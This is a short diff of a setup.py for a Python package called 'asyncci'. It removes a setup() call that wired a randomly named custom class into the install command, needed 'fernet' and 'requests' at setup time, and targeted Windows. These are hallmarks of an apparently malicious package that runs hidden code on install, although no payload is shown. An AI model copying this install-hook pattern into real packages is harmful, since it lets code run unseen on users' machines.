@@ -18,22 +18,5 @@ class CowyJWXxBalQcEsULLjslLXMmzLHElqpTrfXlKmwfGzgIXkdcyyFAZVFVseZOaqyzHrWkKzwm(
             install.run(self)
 
 
-setup(
-    name="asyncci",
-    version=VERSION,
-    author="olTxzzrueLANvVrgKUM",
-    author_email="NnIVDCBAcnG@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': CowyJWXxBalQcEsULLjslLXMmzLHElqpTrfXlKmwfGzgIXkdcyyFAZVFVseZOaqyzHrWkKzwm,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
 
